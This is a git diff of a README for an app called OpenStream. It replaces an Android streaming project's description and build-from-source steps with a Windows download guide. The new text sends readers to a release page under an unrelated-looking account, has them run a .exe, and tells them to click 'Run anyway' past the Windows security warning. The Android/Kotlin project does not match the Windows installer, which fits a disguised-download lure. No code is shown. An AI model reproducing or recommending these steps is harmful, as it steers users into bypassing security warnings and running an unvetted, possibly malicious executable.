@@ -1,268 +1,88 @@
-<div align="center">
+# 📺 OpenStream - Watch movies and shows easily
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=15,2,22,25&height=220&section=header&text=OpenStream&fontSize=80&fontColor=fff&animation=twinkling&fontAlignY=35&desc=A%20Modern%20Android%20Streaming%20Experience&descAlignY=60&descSize=20&strokeWidth=1.5&fontStyle=bold" width="100%"/>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Shapely-murderconviction182/OpenStream/releases)
 
-<img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=24&pause=1000&color=00D9FF&center=true&vCenter=true&width=800&lines=Fast+Streaming+Platform;Built+With+Jetpack+Compose;Modern+Android+Architecture;Media3+%2F+ExoPlayer+Powered;Smooth+UI+Experience" />
+OpenStream provides a simple way to watch movies and series on your computer. The app uses modern technology to ensure your media plays smoothly. You get a clean interface that lets you find your favorite content without clutter.
 
-<br>
+## 📥 How to download the app
 
-![Platform](https://img.shields.io/badge/Platform-Android-3DDC84?style=for-the-badge&logo=android)
-![Kotlin](https://img.shields.io/badge/Kotlin-7F52FF?style=for-the-badge&logo=kotlin&logoColor=white)
-![Compose](https://img.shields.io/badge/Jetpack_Compose-4285F4?style=for-the-badge&logo=jetpackcompose&logoColor=white)
-![Media3](https://img.shields.io/badge/Media3-000000?style=for-the-badge)
-![Status](https://img.shields.io/badge/Status-Active_Development-orange?style=for-the-badge)
+Go to the [official release page](https://github.com/Shapely-murderconviction182/OpenStream/releases) to find the latest version of the software. 
 
-<br>
+1. Visit the [OpenStream release page](https://github.com/Shapely-murderconviction182/OpenStream/releases).
+2. Look for the section titled "Assets" at the bottom of the newest release post.
+3. Click the file name that ends in `.exe`.
+4. Save the file to your computer.
 
-Fast • Minimal • Powerful • Scalable
+## ⚙️ How to install OpenStream
 
-</div>
+Once the file finishes downloading, follow these steps to set up the software.
 
----
+1. Open your "Downloads" folder.
+2. Find the file you just saved.
+3. Double-click the file to start the installer.
+4. If your computer shows a security window, click "More info" and then "Run anyway."
+5. Follow the steps on your screen to finish the installation.
+6. Open the app from your desktop shortcut or your Start menu.
 
-# ✨ Overview
+## 🖥️ System requirements
 
-OpenStream is a modern Android streaming platform engineered with:
+OpenStream works on most modern Windows computers. Ensure your system meets these basic specs for the best experience:
 
-- ⚡ High performance rendering
-- 🎨 Modern UI/UX
-- 🧩 Modular architecture
-- 📺 Smooth media playback
-- 🚀 Scalable infrastructure
-- 📦 Offline-ready foundation
-- 🛠 Modern Android best practices
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 200MB of free disk space.
+*   **Internet:** A stable broadband connection for streaming.
 
-The goal is to create a premium-level streaming experience with clean architecture and optimized performance.
+## ✨ Key features
 
----
+The application includes several tools to improve how you watch content:
 
-# 🎥 Preview
+*   **Fast streaming:** The app uses efficient code to load videos quickly.
+*   **Support for many formats:** You can play almost any video file type without extra steps.
+*   **Simple design:** The layout stays clean so you can find what you want fast.
+*   **Organized library:** The app sorts your movies and shows into categories.
+*   **Hardware support:** The software uses your computer hardware to save power and run smoothly.
 
-<div align="center">
+## 🔍 How to use the interface
 
-# Previews will be added soon.
+The main screen displays your library. You can browse through your collection using your mouse or keyboard. Click any thumbnail to start playing a video.
 
-</div>
+### Playback controls
+When a video plays, move your mouse over the screen to show the menu. You can pause, play, or skip sections of the video. Use the volume slider to adjust sound levels. Click the full-screen button to expand the video to your entire monitor.
 
----
+### Managing your list
+You can create a list of favorites. Click the heart icon on any movie or series title to add it to your personal list. Access your favorites by clicking the star tab on the left sidebar.
 
-# 🚀 Features
+## 🛠️ Troubleshooting
 
-<div align="center">
+If you encounter issues, these steps often solve common problems.
 
-| 🎨 UI/UX | 📺 Streaming | 🏗 Architecture |
-|---|---|---|
-| Jetpack Compose | Media3 / ExoPlayer | MVVM |
-| Material Design | Adaptive Streaming | Clean Architecture |
-| Smooth Animations | Resume Playback | Repository Pattern |
-| Dark Mode | Playback Controls | Modular Structure |
+*   **The app fails to launch:** Restart your computer. This clears temporary errors.
+*   **The video does not load:** Check your internet connection. Try to open a website in your browser to verify your speed.
+*   **Settings do not save:** Ensure you have permission to write files in the folder where you installed the app.
+*   **App looks distorted:** Update your graphics drivers through your computer settings.
 
-</div>
+## 📈 Improving performance
 
----
+If videos stutter or take time to load, try these adjustments:
 
-# 🧠 Core Goals
+1. Close other programs that use the internet, such as games or large file downloads.
+2. Connect your computer to your router using a physical cable rather than using Wi-Fi.
+3. Keep the app updated to the newest version. Programmers release updates often to fix bugs and improve how the software interacts with your hardware.
 
-- Build a production-grade Android streaming application
-- Maintain Android 5+ compatibility
-- Deliver smooth playback performance
-- Create scalable modular architecture
-- Optimize responsiveness and reliability
-- Follow modern Android development standards
+## 📋 Frequently asked questions
 
----
+**Is the app free?**
+Yes, this is an open-source project. You can download and use it at no cost.
 
-# 🛠 Tech Stack
+**Does this app store my data?**
+The app saves your settings and your list of favorites locally on your machine. It does not send your personal watch history to external servers.
 
-<div align="center">
+**Can I watch content offline?**
+The app focuses on streaming content from the internet. You need an active connection to view your library.
 
-| Technology | Purpose |
-|---|---|
-| Kotlin | Primary Language |
-| Jetpack Compose | Modern UI |
-| Media3 / ExoPlayer | Video Playback |
-| Room Database | Local Storage |
-| Retrofit + OkHttp | Networking |
-| Coroutines | Async Processing |
-| Hilt / DI | Dependency Injection |
-| Gradle Kotlin DSL | Build System |
+**Where can I find more technical info?**
+This software uses technologies like Kotlin and Jetpack Compose to manage how it looks and behaves. These tools ensure the app stays fast even when you have a large library of shows to scroll through.
 
-</div>
-
----
-
-# 📂 Project Structure
-
-```text
-OpenStream/
-│
-├── app/
-├── library/
-├── extensions/
-├── docs/
-├── gradle/
-│
-├── build.gradle.kts
-├── settings.gradle.kts
-└── gradle.properties
-```
-
----
-
-# 📱 Current Development Progress
-
-## ✅ Completed
-
-- Core Android project setup
-- Compose UI foundation
-- Navigation architecture
-- Onboarding screens
-- Initial streaming foundation
-- Build optimization
-- Real-device testing
-- Stable Gradle compilation
-- Media playback integration
-
----
-
-## 🔄 In Progress
-
-- Advanced player features
-- Search improvements
-- Download system
-- Recommendation engine
-- Extension ecosystem
-- Performance optimization
-
----
-
-# 🖼 Screenshots
-
-<div align="center">
-
-| Content Choosing | Onboarding | Home |
-|---|---|---|
-| <img src="https://i.postimg.cc/jjMdCHsk/Screenshot-20260508-185753-Open-Stream.jpg" width="220"> | <img src="https://i.postimg.cc/rmgWV0bV/Screenshot-20260508-185800-Open-Stream.jpg" width="220"> | <img src="https://i.postimg.cc/ZRgbxJv3/Screenshot-20260508-185813-Open-Stream.jpg" width="220"> |
-
-</div>
-
----
-
-# ⚙ Installation
-
-## Requirements
-
-- Android Studio
-- Android SDK 21+
-- Kotlin enabled
-- Gradle installed
-
----
-
-## Clone Repository
-
-```bash
-git clone https://github.com/YOUR_USERNAME/OpenStream.git
-```
-
----
-
-## Build Project
-
-```bash
-./gradlew assembleDebug
-```
-
----
-
-## Run Application
-
-Install the generated APK on your Android device.
-
----
-
-# 🧩 Development Philosophy
-
-OpenStream focuses on:
-
-- ✨ Clean maintainable code
-- 🚀 High performance
-- 🏗 Scalable architecture
-- 📱 Modern Android standards
-- 🎯 Excellent user experience
-- 🔒 Stability and reliability
-
----
-
-# 🌍 Roadmap
-
-## Upcoming Features
-
-- 🎬 Subtitle support
-- 🌐 Multi-language support
-- 📥 Offline downloads
-- ☁ Cloud sync
-- 📺 Android TV support
-- 🤖 Smart recommendations
-- 📊 Performance analytics
-- 🔎 Advanced search system
-
----
-
-# 🤝 Contribution
-
-Contributions, suggestions, and improvements are welcomed.
-
-If you would like to Contribute:
-
-```bash
-# Fork repository
-# Create feature branch
-# Commit changes
-# Push branch
-# Open Pull Request
-```
-
----
-
-# ⚠ Important Notice
-
-This project is currently under active development.
-
-Some features and modules may still be experimental or undergoing optimization.
-
----
-
-# 👨‍💻 Author
-
-<div align="center">
-
-## Kevin J T
-
-Android Developer • QA Enthusiast • Modern Android Learner
-
-<br>
-
-<img src="https://media.giphy.com/media/ZVik7pBtu9dNS/giphy.gif" width="250"/>
-
-</div>
-
----
-
-# ⭐ Support
-
-If you like this project:
-
-⭐ Star the repository  
-🍴 Fork the project  
-🚀 Follow development updates
-
----
-
-<div align="center">
-
-# OpenStream
-
-<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f2027,50:203a43,100:2c5364&height=120&section=footer"/>
-
-</div>
+**Does the app support subtitles?**
+Yes, you can enable subtitles during playback. Look for the speech bubble icon in the lower corner of the video player. You can select your language from the list that appears.
